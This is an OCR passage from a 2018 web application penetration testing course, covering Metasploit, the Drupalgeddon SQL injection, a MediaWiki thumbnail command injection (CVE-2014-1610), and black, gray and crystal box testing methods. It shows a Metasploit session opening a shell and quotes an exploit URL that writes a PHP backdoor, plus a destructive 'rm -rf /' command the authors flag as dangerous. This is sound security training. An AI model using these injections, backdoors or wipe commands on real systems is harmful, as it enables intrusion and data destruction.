capabilities related to custom web application attacks. On this front, the capabilities are mainly associated with 
the WMAP plugin or auxiliary modules. As we have seen already, these can prove useful. In addition, 
Metasploit's integration with other web-related tools can bolster our exploitation capabilities. 
Again, although Metasploit does offer the pure web application penetration tester some functionality, the most 
important way we can wield this tool is in exploiting known vulnerabilities. Although the list of web-related 
vulnerabilities is far too large to present here, some categories are particularly useful. 
An extremely common vulnerable target in the web application infrastructure includes CMS applications such as 
WordPress, Drupal, and Joomla. Another target of interest includes the database servers behind the web 
applications. Many interesting exploits for those systems exist. We have seen Heartbleed and Shellshock already 
this week. Though we did not use Metasploit, it offers modules for targeting those vulnerabilities as well. 
Shortly, we explore one additional attack of interest, Drupalgeddon. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
71 
'-..../ 
'-..../ 
• Drupal represents one of the most commonly employed web Content 
Management Systems (CMS): 
o WordPress being the most popular; J oomla rounds out the top three 
• These systems are key to serving content to end users and provide many 
capabilities 
• Drupal's functionality can be extended with modules, much like WordPress 
employs plugins 
• The nature of CMS makes them high-value targets for web application 
penetration testing 
• The criticality of the CMS can present patching challenges 
o Especially when accounting for modules/plugins, which are often the vehicle for 
compromising a CMS 
'-..../ 
'-..../ 
'-....,I 
'-.J 
'-..../ 
'-....,I 
'-....,I 
'--,I 
'-....,I 
'-....,I 
'----' 
'--,I 
'----' 
'----' 
Web Content Management Systems (CMSs) are significant targets within the web application infrastructure. 
WordPress, Joomla, and Drupal are typically the most widely used CMSs on the Internet. Being both incredibly 
common and a key component in delivering content to end users, these systems represent high-value targets. 
We have already worked with WordPress briefly, and now let's tum our attention to Drupal. One of the 
differentiators of a web CMS is the strength and volume of code dedicated to extending functionality. In 
WordPress, these are plugins, whereas in the Drupal universe they are called modules. 
Third-party Drupal modules and WordPress plugins are an incredibly common vector for compromise. Patching 
the core CMS code is not sufficient because the modules and plugins can be a point of exposure as well. Further 
challenges are the lower likelihood for these third-party extensions to all have equivalent coverage by 
vulnerability scanners. This lack of visibility can lead to organizations being caught unaware that they had a 
known vulnerability exposed to the Internet. 
72 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-..../ 
'-.J 
'----' 
'-.J 
'----' 
'----' 
'----' 
'-..../ 
'----' 
'-" 
'----' 
'--,I 
'--,I 
'----' 
'--,I 
'----' 
'-....,I 
'-" 
'-....,I 
'-....,I 
'-....,I 
'-../ 
'----' 
'-1 
'--./ 
'-.., 
Drupalgeddon 
• Drupal Security Team announced a vulnerability (CVE-2014- 
37041) and associated patch on October 15, 2014 
• The flaw is an unauthenticated SQL injection vulnerability 
present on all Drupal 7 installs 
• Successful exploitation yields: 
o Unfettered data access 
o Remote code execution 
o Local privilege escalation capabilities, etc. 2 
• Widespread automated exploitation in hours 
Although the majority of CMS exploitation these days seems to stem from poor plugin/module security, this was 
not the case for an extremely critical Drupal flaw in 2014. Drupalgeddon is the name used for discussing SA- 
CORE-2014-005 (CVE-2014-3704), which was announced October 15, 2014. 
Rather than merely impacting a small number of installations that employed a vulnerable third-party Drupal 
module, this vulnerability affected Drupal Core on Drupal 7 installs. Every Drupal 7 install lacking the patch 
released October 15 was vulnerable. 
The vulnerability in question was an unauthenticated SQL injection flaw. Exploitation of this vulnerability, 
which proved straightforward, would provide adversaries unfettered access to the entire CMS, potential for 
privilege escalation, and the ability to execute arbitrary PHP. Drupal gave this vulnerability its highest (worst) 
possible rating. 
References: 
[l] https://www.drupal.org/SA-CORE-2014-005 (https://cyber.gd/542 _551) QR 
[2] https:/ /www.sektioneins.de/en/advisories/advisory-O 12014-drupal-pre-auth-sql-injection-vulnerability .html 
(https://cyber.gd/542 _ 516) 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
73 
'-" 
'-" 
....... , ..... Drupal .. Site GotHacked;NowWhat?''1 
"You should proceed under the assumption that every Drupal 
7 website was compromised unless updated or patched 
before Oct isth, 11pm UTC, that is 7 hours after the 
announcement." 2 
- Drupal Security Team 
'--' 
\_.- 
'-" 
'----" 
'-../ 
'--' 
'----" 
'----" 
'----" 
'----" 
'----" 
'----" 
'----" 
The quotes from Drupal speak for themselves loudly on this slide. 
"Your Drupal site got hacked, now what?"! 
"You should proceed under the assumption that every Drupal 7 website was compromised unless updated or 
patched before Oct 15th, 11pm UTC, that is 7 hours after the announcement." 2 (from the Drupal Security 
Team's Public Service Announcement) 
"If you find that your site is already patched but you didn't do it, that can be a symptom that the site was 
compromised - some attacks have applied the patch as a way to guarantee they are the only attacker in control 
of the site. "3 
References: 
[1] https://www.drupal.org/node/2365547 (https://cyber.gd/542 _518) 
[2] https://www.drupal.org/PSA-2014-003 (https://cyber.gd/542 _515) QR 
[3] Ibid. 
74 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'----" 
'---' 
'----" 
'----" 
'----" 
'-" 
'----" 
'----" 
'---' 
'-" 
'----" 
'-" 
'----" 
'----" 
'-../ 
'----" 
'----" 
'---' 
'----" 
'----" 
'-" 
'----" 
'----" 
'-" 
'---' 
'-J 
Drupalgeddon (Gory) Details 
• To help defend against potential SQ Li, Drupal uses prepared statements exclusively for all 
SQL queries 
o IN clauses, for example, SELECT * from users WHERE name IN (Ford, Zaphod, 
Trillian} , can be problematic for prepared statements when arrays are supplied for the values 
• Drupal includes a function expand.Arguments () that explodes the arrays and turns them 
into something that can be more easily handled by prepared statements and passed to the 
database 
o The Drupalgeddon flaw is that the expand.Arguments (} function does not handle specially crafted 
input properly 
• Drupal leverages PDO (PHP Data Object) as an abstraction layer, which employs emulated 
prepared statements, which can compound the issue 
o Concern, in this case, is that emulated prepared statements allow for multiple queries as one 
statement, whereas traditionally prepared statements would not 
• Any unfiltered input that an adversary can supply that will be passed to the 
expand.Arguments () function could provide an exploit entry point 
Although exploitation of the flaw does not require us to understand some of the details, at least a passing overview 
of some of the details seems prudent. We already know that the flaw exposed a SQL injection vulnerability that 
could be exploited without authentication. One thing that might surprise some developers is that Drupal employs 
prepared statements for all SQL queries. The reason that might be a bit surprising is that prepared statements are a 
method for preventing SQL injection attacks. Ironically, a function that helped enable this SQL injection defense 
mechanism was the entry point for the SQL injection flaw. 
The function in question, expandArguments(), handles the case in which arrays are passed as arguments, which can 
be problematic for prepared statements. 
1 Adversaries can exploit the vulnerability by getting expandArguments() to 
parse their unsanitized maliciously crafted input.2 
A compounding issue stems from Drupal leveraging PDO, which employs emulated prepared statements. The 
challenge with the emulated prepared statements is that they support multiple queries to be considered one 
statement, which enables the attacker to pivot from a SELECT to an INSERT statement.3 
Note: For students wanting to dig even deeper, the following first and third references dive into the issues at 
considerably more depth than our overview here. 
References: 
[ 1] https://www.sektioneins.de/en/advisories/advisory-O I 2014-drupal-pre-auth-sql-injection-vulnerability.html 
(https://cyber.gd/542 _516) 
I• I 
[2] https://github.com/drupal/drupal/blob/7 .31 /includes/database/database.inc#L 739 
(https://cyber.gd/542 _519) 
[3] http://blog.ircmaxell.com/2014/1 Ola-lesson-in-security.html (https://cyber.gd/542 _520) QR 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
75 
.,__, 
.,__, 
Metasplo.if +Drupalgeddon 
exploit/multi/http/drupal drupageddon 
!*l Started bind handler 
[*l drupal:86 - Testing page 
!*l drupal:86 
creating new user XAfMbgimYv:JzuzcKAzpF 
[*l drupal:80 
Logging in as XAfMbgimYv:Jzm:cKAzpF 
[*l drupal:ae - Trying to parse enabled modules 
[*! drupal:80 
Enabling the PHP filter module 
l*l drupat rae 
Setting permissions for PHP filter module 
[*l drupal:80 
Getting tokens from create new article page 
[*J drupat i se 
Calling preview page. Exploit should trigger ... 
[••J command shell session 6 opened {127.8.0.1:41363 ·> 127.5.5,5:54321) 
81-08 GG:50:37 ·0800 
id 
uid=33 ( www-data) gid=33 h1ww-dat al g roups=33 (WWW · data) 
._.I 
'-.../ 
'-' 
'-' 
'-' 
Numerous PoC exploits for Drupalgeddon exist. The researcher that discovered the flaw posted two PoC 
exploits for the flaw. 
1 One exploit enables hijacking an administrative session, whereas the other enables remote 
code execution. As would be expected, a Metasploit module can also be used to exploit this flaw.2 
From within the msfconsole, you can simply use the following: 
msf> use exploit/multi/http/drupal drupageddon 
Then, define the target, choose a payload, and launch the exploit. 
The console provides feedback as to what it is actually doing. For more detail, use the set Proxies 
configuration option within Metasploit to have the exploit flow through one of the interception proxies. For 
example, to have the exploitation flow through Burp on the class VM, use the following statement: 
msf exploit(drupal_drupageddon)> set Proxies HTTP:127.0.0.1:8082 
References:· 
[ 1] https://www.sektioneins.de/en/blog/ 14-11-03-drupal-sq 1-injection-vulnerability-PoC.html 
(https://cyber.gd/542 _517) 
[2] https://raw.githubusercontent.com/rapid7 /metasploit- 
framework/master/mod ules/ exp I oits/m ulti/http/ drupal _ drupageddon.rb 
(https://cyber.gd/542 _521) QR 
76 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'-' 
\-.._.,· 
'-' 
'-' 
'-' 
'-' 
\,_..,I 
'-' 
'-.../ 
'-../ 
'-' 
'-' 
'-' 
'-' 
'-.../ 
'-' 
'-.../ 
'-' 
'-.../ 
'-' 
.,__, 
'-" 
'-' 
'-.._,. 
.,__, 
'-' 
'-' 
'-" 
'-.../ 
'-" 
'-' 
.,__, 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
CSRF, LOGIC FLAWS,AND ADVANCED TOOLS 
I. Cross-Site Request For•i;rei-v 
2. Exercise: CSRF 
3. Logic Attacks 
4. Exercise: Mobile MITM 
5. Python for Web App Pen Testers 
6. Exercise: Python 
WPScan 
ll. Exercise: WPScan 
9. w3af 
! 0. Exercise: w3af 
! I • Metasploit 
I 2. Exercise: Metasploit 
13. When Tools Fail 
14. Exercise: When Tools.fail 
Pen Testing Methods 
! 6. Web App Pen 
I 7. Reporting and Pre;se,itir1,v 
Ill. Summary 
SECS42 I Web App Penetration Testing and Ethical Hacking 
77 
Course Roadmap 
Next up is an exercise on Metasploit, exploiting Drupalgeddon and Shellshock. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
77 
SECS42 Workbook: Metasploit 
': ~J 
Exercise 5.6: Metasploit 
SEC542 I Web App Penetration Testing and Ethical Hacking 
78 
'--' 
\..J 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'-..../ 
'--' 
'-.J 
'--' 
'--' 
'--' 
'--' 
'--' 
'--' 
'---' 
SEC542 Workbook: Metasploit 
'---' 
'--' 
Please go to Exercise 5.6 in the 542 Workbook. 
'--' 
'---' 
'---' 
.,___, 
'--' 
'--' 
'-' 
'--' 
'--' 
'--' 
'--' 
'---' 
'-" 
'--' 
'--' 
'--' 
'-' 
'-' 
'---' 
78 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--' 
'-..../ 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
CSRF, LOGIC FLAWS,AND ADVANCED TOOLS 
I. Cross-Site Request .-ni·l>t>1N 
2. Exercise: CSRF 
l. 
Attacks 
4. Exercise: Mobile 
S. Python for Web App Peri Testers 
6. Exercise: Python 
7. WPScan 
8. · Exercise: WPScan 
9. wlaf 
! !.'I. Exercise: wlaf 
11 • Metasploit 
12.. Exercise; Metasploit 
13. When Tools Fail 
14. Exercise: When 
IS. Pen Testing Methods 
Web App Pen Test l'rt~oal'at1on 
17. Rep.orting and Presenting 
Ht Summary 
SEC542 J Web App Penetration Testing and Ethical Hacking 
1., 
Course Roadmap 
The next section describes what happens (to professionals) when their penetration testing tools fail. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
79 
..___, 
Tools such as Metasploit are fantastically powerful and work extremely well 
• Until they don't 
What happens when: 
• You accurately identify a vulnerable web application 
• A tool such as Metasploit contains a matching exploit 
• You configure everything and ... the exploit fails 
Reasons for failure: 
• Differences in server configurations (sometimes subtle) 
• Tool quality issues 
• Some tool/ exploit options may work more reliably than others 
• Penetration testing results are often nondeterministic 
\.J 
·,_J 
'-J 
'-' 
'-' 
'-J 
'---' 
'-J 
'-J 
'-J 
'-J 
'-J 
'-' 
'-..../ 
Our tools are wonderful and work quite well. .. until they don't. 
We expect to perform more of the heavy "lifting" with interception proxies such as Burp Suite and ZAP: We 
know more upfront knowledge is required, as well as more manual configuration. This, as we have discussed 
previously, is what makes web application penetration testing so challenging (and rewarding). 
It is not uncommon to suffer false negatives with more automated tools such as Metasploit, Core Impact, 
Immunity Canvas, and more: The web application is vulnerable, the tool has a matching exploit, and the tool 
fails. 
One of the issues that makes penetration testing challenging (and rewarding) is nondeterminism. This means that 
we may perform the exact same series of steps multiple times and achieve different results. 
For example, virtually every penetration tester has typed exploit in Metasploit and pressed Enter, failed, then 
pressed Up Arrow, Enter, and succeeded. 
The good news regarding web applications is the attacks themselves can often be quite simple, and many require 
only a specially crafted URL as the crux of the exploit. When we learn the elements of that URL, we may 
attempt manual exploitation. 
80 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-J 
.__; 
'-..../ 
'-..../ 
'-J 
'-J 
'-..../ 
'---" 
'-..../ 
'-..../ 
'-J 
'-' 
'-..../ 
'-J 
'-J 
'-J 
'-J 
'---" 
'--"' 
'-' 
'-J 
'---' 
'-' 
'--"' 
'---" 
'Taking It to the Next Level 
In these cases, some amateur penetration testers abandon exploitation and 
mark the flaw as critical 
• To be fair: Time constraints often play a role here 
• But many clients ignore critical findings that were not exploited 
Additional testing often uncovers tool options that work more reliably 
• This may be dangerous on a live client system/network 
• Penetration testing labs can be quite beneficial for this purpose 
Another option is researching both the exploit and the vulnerability 
• This may illustrate which tool options work reliably 
• Manual exploitation may also be possible 
We always want to be sure to "hack all the things" whenever possible (assuming they are in scope). An initial 
false negative (the site is vulnerable but the tool fails) happens to all penetration testers at some point in their 
career. What happens next can be a place in which a quality penetration tester can shine. 
One option is to simply keep retrying various tool options against the client site. This works but may cause 
stability issues ( or worse). 
Another option is configuring a mirror of the client site in a penetration testing lab and testing there. This is 
certainly safer but more time-consuming. Penetration tests typically fail for one of two reasons: Limited scope 
and lack of time. Running out of time is a valid issue: Many penetration tests are limited to 40 or 80 hours and 
that typically includes report writing, delivery, and more. 
At this point, it is often helpful to perform some quick research to better understand the vulnerability and the 
exploit. 
Some flaws, such as those leading to buffer or heap overflows, can be quite complex, especially with modem 
defenses such as Address Space Layout Randomization (ASLR), stack canaries, and so on. Web application 
exploits, however, can be quite simple: They often require a single (properly formatted) URL, as we see next. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
81 
\.J 
'-' 
• For example, custaz.secgaz.com has a vulnerable version (1.21.4) 
of Media Wiki installed 
• Metasploit has a matching exploit: 
o exploit/multi/http/mediawiki_thumb 
• The Metasploit exploit (initially) failed, due to the use of default 
options 
o See notes for details 
o We researched the flaw to better understand it 
\.J 
'-' 
'-../ 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-../ 
.,____,, 
'-../ 
We intended to use the Metasploit mediawiki_thumb exploit as one of the final pieces of the cust42.sec542.com 
"story": 
• 
Discover the name cust42.sec542.com via a DNS brute force (wordlist) attack. 
• 
Later discover http://cust42.sec542.com/mwiki via ZAP forced browse. 
• 
Later exploit the discovered Media Wiki software as part of a new Metasploit exercise. 
We were surprised to see Metasploit initially fail to exploit MediaWiki, despite the fact that we intentionally 
installed and configured a vulnerable version. 
We eventually dug further and found the issue: The Metasploit exploit has two options - DjVu and PDF. The 
default is DjVu, which failed for us with default Metasploit settings. DjVu (pronounced deja vu) is a compressed 
image format designed to handle scans of large documents. 
We decided to dig deeper and see ifwe could learn more about the exploit and attempt to manually exploit the 
flaw. 
82 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'-' 
.,____,, 
'-' 
'-../ 
'-../ 
'-../ 
'-' 
'-' 
'-' 
'-' 
\.J 
'-' 
'-' 
'-' 
'-../ 
'-' 
'-.../ 
'-../ 
'-' 
'-' 
'-../ 
'-' 
'-../ 
'-' 
'-../ 
Research the Flaw 
We researched the MediaWiki flaw (CVE 2014-1610) 
• This was a big one; even wikipedia.org was rumored to be vulnerable at the time' 
Metasploit's "info" contained useful links, listed under References: 
• http://cvedetails.com/cve/CVE-2014-1610/ 
• https://www.cvedetails.com/cve/CVE-2014-1610/ (https://cyber.gd/ 414_562) 
• http:/ /www.checkpoint.com/threatcloud-central/ articles/ 2014-01 -28-tc-researchers-discover. html 
• https:/ /bugzilla. wikimedia.org/ show _bug.cgi?id=60339 
The first link indicated a public exploit was available 
MediaWlld 1.22.x before L22.1, 1.21.x before 1.21.s, and 1.19.x before 1.19.11, when DjVu or PDF file upload support Is enabled, auows remote 
attackers to execute arbitrary commands via shell metacheracters in ( 1.) the page parameter to indudes/media/DjVu,php; {2) the w parameter (aka width 
field) to tnumb.php, Which is oat pr<>perty handled by rnciudestmedla/PdfHaMler_body.php; and possibly unspecified vectors in (3) 
,nciudes/media/ll,tmap.php and (4) includes/media{lmageHaodler.php. 
Metasploit's info contained useful information for our quest to manually exploit the flaw: 
Description: 
MediaWiki 1.22.x before 1.22.2, 1.21.x before 1.21.5 and 1.19.x 
before 1.19.11, when DjVu or PDF file upload support is enabled, 
allows remote unauthenticated users to execute arbitrary commands 
via shell metacharacters. If no target file is specified this module 
will attempt to log in with the provided credentials to upload a 
file (.DjVu) to use for exploitation. 
http://cvedetails.com/cve/2014-l6l0/ 
http:/ 1v,ww. osvdh. org/102638 
http:/ /vMJ. checkpoint .co11/threatcloud-central/articles/2614-81-28-tc-resear 
chers-discover.html 
https://bugzilla.wikimedia.org/show_bug.cgi?id=60339 
exploit(11ediawiki_thu111b) > I 
Clicking the first link to cvedetails.com indicated Vulnerability Details: CVE-2014-1610 ( I public exploit). 
Note the live link has changed slightly.2 
References: 
[ 1] https://www.exploit-db.com/exploits/31329/ (https://cyber.gd/542 _526) 
[2] http://www.cvedetails.com/cve/CVE-2014-1610/ (https://cyber.gd/542 _553) 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
83 
\J 
# Exploit: 
#################################################################### 
1. upload Longcat.pdf to wikimedia ems site (with PDF Handler enabled) 
http://vulnerable-site/index.php/Special:Upload 
2. inject os cmd to upload a php-backdoor 
http://vulnerable-site/thumb.php?f=Longcat.pdf&w=10l'echo%20 
"<?php%20system(\\$_GET[1]);">images/xnz.php' 
3. access to php-backdoor! 
http://vulnerable-site/images/xnz.php?1~rm%20-rf%20%2f%20--no-preserve- 
4. happy pwning! ! 
I 1 
1. 
Upload a PDF to a vulnerable Media Wiki site 
2. 
Use the vulnerable thumb.php script to upload a PHP backdoor 
3. 
Run a naughty command: rm -rf / - -no-preserve 
• We'll substitute a nicer command! 
4. 
Happy pwning! ! 
• Details are in the notes 
,,__, 
'--./ 
''--' 
\J 
'-' 
'-' 
'-.,I 
'-' 
'--' 
'--' 
'--' 
'--' 
..,__,, 
Let's break down step 2. The upcoming lab will use FAQ.pdf as the uploaded script, so we'll reference that and 
omit the site for now for clarity. Assume we already uploaded FAQ.pdf, as directed in step one. We will also 
convert the %20 characters to spaces, again for clarity: 
thumb.php?f=FAQ.pdf&w=lOl'echo "<?php system(\\$ GET[l]);">images/FAQ.php' 
'-' 
\J 
'-" 
\J 
'-.,I 
..,__,, 
..,__,, 
'--' 
This tells the thumb.php script to generate a thumbnail ofFAQ.pdf(f=FAQ.pdf) 
'-" 
'-' 
The width parameter (w=) contains a vulnerability that allows command injection. The width is 10, followed by 
a shell pipe, followed by a shell command (surrounded by backticks) that tells the OS to create a PHP shell in 
images/F AQ.php. The PHP shell takes one parameter (the variable name "l "), allowing the command shown 
here. 
The command listed in step 3 is naughty and illustrates why you need to understand what you're doing before 
blindly copying and pasting exploits to try them out on your own. rm -rf / =no-preserve tells rm to recursively 
remove all files in the root directory (meaning the entire file system). The --no-preserve option may be a typo. 
(We are showing the original exploit, unedited.) The correct option is =no-preserve-root, which tells rm "do not 
treat'/' specially," meaning it's OK to delete it. 
We can run a nicer command, such as: 
http://vulnerable-site/images/FAQ.php?l=id 
Reference: 
[1] https://www.exploit-db.com/exploits/31329/ (https://cyber.gd/542 _526) QR 
84 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--./ 
'-' 
'-'' 
..,__,, 
'-' 
'--' 
'--' 
\._., 
'--' 
'-.,I 
'-' 
\J 
\J 
'-' 
'---' 
Back to Metasploit 
• After we verified that a PDF upload could be used to trigger the vulnerability, 
we went back to Metasploit and tested 
• The exploit supports either DjVu or PDF images 
• If the FILENAME is blank, Metasploit uploads metasploit.djvu, renamed to a 
random four-letter name 
o Default behavior 
o This option failed for us, perhaps due to a server configuration issue 
• If the FILENAME is not blank, Metasploit assumes it was uploaded and 
generates a thumbnail from there 
o Manual upload of djvu file: Fail 
o Manual upload of PDF file: Success! 
If the FILENAME option is blank, Metasploit uploads this DjVu image of the Metasploit logo (see below): 
• 
/opt/metasploit-framework/data/exploits/cve-2014-1610/metasploit.djvu 
The mediawiki thumb exploit documentation is a bit sparse; we had to view the source code to better 
understand how it worked. The exploit's Ruby code is available in your Security542 Linux VM at: 
• 
/opt/metasploit-framework/modules/exploits/multi/http/mediawiki_thumb.rb 
Metasploit then attempts to generate a thumbnail from the image, which failed during our testing, most likely 
due to a Media Wiki server configuration issue regarding generating thumbnails of DjVu files. 
We then manually uploaded a different DjVu image and uploaded it. We set FILENAME to that image, and the 
exploit also failed (probably for the same reason). 
Then we manually uploaded a PDF and set FILENAME to that image. Success! 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
85 
'-" 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
CSRF, LOGIC FLAWS,AND ADVANCED TOOLS 
. Cross-Site Request Forgery 
2. Exercise: CSRF 
l. Logic Att,v::ks 
4. Exercise: Mobile MITH 
5. Python for Web App Pen Testers 
6. Exercise: Python 
7. WPScan 
8. Exercise: WPScan 
9. wlaf 
HI. Exercise; wlaf 
I I • Metasploit 
12. Exercise: Metasploit 
13. When Tools 
14. Exercise: When Tools Fail 
I 5. Pen Testing Methods 
16. Web App Pen Test Preparation 
17. Reporting and Presenting 
IS.Summary 
SEC54l /Web App PenetrationTesttog and Ethical Hacking 
86 
·-._,, 
'-,/ 
'-" 
'-" 
.._,, 
'-" 
'-" 
'-" 
'---' 
..___, 
'-" 
'----' 
'----' 
Course Roadmap 
We will next experience the failure of our tools first-hand, and find a workaround to exploit the system. 
86 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-" 
_____, 
_____, 
'----' 
'-" 
'-" 
..___, 
'----' 
'----' 
'-" 
'----' 
'-,/ 
'----' 
..___, 
'----' 
..___, 
'-" 
'----' 
..__,,, 
'-,/ 
'-" 
'-" 
.._,, 
'--,I 
.._,, 
..___, 
SEC542 Workbook: When Tools Fail 
...::.. 
Exercise 5.7: When Tools Fail 
SEC542 j Web App Penetrati<mTe 
87 
SEC542 Workbook: When Tools Fail 
Please go to Exercise 5.7 in the 542 Workbook. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
87 
.'--1 
'--' 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
CSRF,LOGIC FLAWS,ANDADVANCEDTOOLS 
I. Cross-Site Request Forgery 
2.. Exercise: CSRF 
3. Logic Attacks 
4. Exercise: Mobile MITM 
S. Python for Web App Pen Testers 
6. Exercise: Python 
7. WPScan 
8. Exercise: WPScan 
9. 
IO. Exercisee wlaf 
I I . Metasploit 
12. Exercise: Metasploit 
13. When Tools fail 
14, Exercise: When Tools Fail 
IS. Pen Testing Methods 
!6. Web App Pen Test Preparation 
! 7. Reporting and Presenting 
18. Summary 
SEC542 I Web App Penetration Testing and Ethical Hacking 
88 
'--1 
'--' 
'-' 
'-' 
'-.-' 
~ 
'---" 
'---" 
'---" 
'--1 
'---" 
'--,/ 
'-.-' 
'---" 
.__, 
'-' 
'-' 
Course Roadmap 
'-' 
'-' 
We will next discuss penetration testing methods. 
'-../ 
~ 
'-.-' 
'---" 
~ 
'-../ 
'---" 
'---" 
'-' 
'-' 
'--,/ 
'---" 
'---' 
'---" 
'---" 
'--,/ 
'-' 
'-' 
88 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-.../ 
'-../ 
Black Box Penetration 'Testing 
Little or no information provided to the testers in advance 
• Perhaps just the name of the target enterprise, an IP address range, or 
possibly a URL 
• The target is a black box that the tester must explore to understand 
Typically, not done in web application testing 
• Except in the movies 
• We advise against such an approach 
Hardest to accomplish because most enterprises have multiple 
applications 
• Requires close coordination between testers and target system personnel to 
make sure testers remain in scope 
A black box test is not done very often but seems to be the one that everybody thinks of when penetration testing 
is mentioned. Although it is possible to perform a web application test with just the URL as a starting point, we 
wouldn't recommend it! 
In a black box penetration test, the testers are given little or no information about the target environment in 
advance. Black box testing is seen more often during network tests that include any web applications found. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
89 
Crystal B.OX·• PenetrationTesting 
• Completely open test 
o Testers are provided with information in advance, potentially including: 
• Target URL(s) 
• Application functionality summary 
• Application map 
• Test accounts 
EJJ 
o As test progresses, target system personnel answer questions for the testers 
• Often performed by an internal team 
o Increasingly third-party testers are engaging in this type of test 
• Integral part of the development process 
• Source code is available to the tester 
'-.../ 
'-.../ 
'---' 
'-.../ 
'-.../ 
'-.../ 
'-.../ 
'-.../ 
'-J 
'-.../ 
'---' 
'---' 
'-.../ 
'-.../ 
'-.../ 
'-.../ 
Crystal box testing is the most cooperative test. It is usually done by an internal team, but more often outside 
firms are being asked to perform this type of testing. The testing team is usually part of the QA team and as such 
becomes part of the software development life cycle within the company. They usually have access to the source 
code and will review it and any bug reports to find vulnerabilities. An external team brought on for this type of 
test needs to make sure that it quickly understands the development processes used and integrates itself rapidly. 
90 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-.../ 
'-.../ 
'---' 
'-.../ 
'-.../ 
'-.../ 
..._.,, 
'-.J 
'-.../ 
'-' 
'-.../ 
'-.../ 
'-.../ 
'---" 
'-.../ 
'-' 
'-.../ 
'-" 
'-.../ 
'-../ 
'-J 
'-.../ 
'-.../ 
Gray Box Penetration Testing 
• Testers are provided some limited information at the outset of a 
test 
oURLs 
o User accounts 
• As the test progresses, information gathering is critical for success 
• Most tests performed today fall into this category 
• This is the model explored in class because it is 
the most common form of test 
The gray box test is the most common test done by external companies. It requires the testing firm to do more 
work up front to gather the needed information. Communication between the testing team and the application 
owners during the test is also critical. Typically, internal teams do not perform this type oftest because they are 
part of the development process. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
91 
'-..,I 
Testing Methods: .. Manual. vs.AutornatedTesting 
There are two gef
1 eral methods for testing web applications: 
• Manual testing using scripts and tools 
• Using automated I esting tools 
We are often askjd, "Which works better?" 
• Let's explore the pros and cons of each approach in more detail 
'--" 
'--" 
'-...,/ 
'-...,/ 
'--.., 
'-' 
'--" 
'-' 
'--" 
'-...,/ 
'-...,/ 
'--" 
'-...,/ 
In the next few slides, we are going to discuss the differences between manually testing an application and 
running automated tools. Then we will talk about which is better. This is a very common question, both from 
penetration testers and others. 
Each of the methods has its strengths, but it also has weaknesses. As penetration testers, we need to understand 
these differences and work around or with them during our tests. 
92 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-...,/ 
'-...,/ 
'-...,/ 
'-' 
'-...,/ 
'--" 
'--" 
'---' 
'-...,/ 
'-...,/ 
'--' 
'-...,/ 
'--' 
'-...,/ 
'-...,/ 
'-...,/ 
'-...,/ 
'-...,/ 
'-.../ 
'-...,/ 
'-..../ 
'--" 
'-...,/ 
'-' 
'-...,/ 
'-' 
Manual Web App Penetration Testing 
• Human tester processes each page of the target application 
• Although we call this "manual" testing, scripts and interactive 
tools are used 
o Tools are used to help formulate and manipulate requests and gather and 
analyze responses 
• Time-consuming because a human tester controls each request 
and analyzes each response 
• Thoroughness of such testing depends on tester's time, attention, 
and skill set 
• Able to discover logic or business flaws 
Testing and Ethical Hacking 
Manual attacks are one of the first ways that someone who wants to really understand an attack will use. 
Although we call it manual, simple scripts and tools can be used. This method is relatively slow compared to 
automated testing, but can be as thorough as the tester chooses, because he or she controls the entire test. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
93 
'-' 
'-./ 
'-" 
Automated Web App Penetration Testing 
• Automated tools scan a target website 
looking for signs of vulnerabilities 
• Many automated scanners available, 
both commercial and open source: 
o HP Weblnspect - commercial 
o Trustwave App Scanner - commercial 
o IBM AppScan - commercial 
o ZAP-free 
o Burp Suite - free/ commercial 
• Rapidly scans site but can still take a 
long time 
o Generally, requires less time than manual 
testing 
• Tester has less control of 
thoroughness 
o But, resulting tests tend to be more 
standardized and consistent 
• Such an approach is more prone to 
false positives 
• Also, this approach typically 
provides less detail about business 
implications of discovered flaws 
o More of a surface view of vulnerabilities, 
rather than in-depth penetration 
'--" 
'--" 
'-" 
'--" 
'--" 
'--" 
'--" 
'-" 
'-.J 
'-' 
'-./ 
'-J 
'-./ 
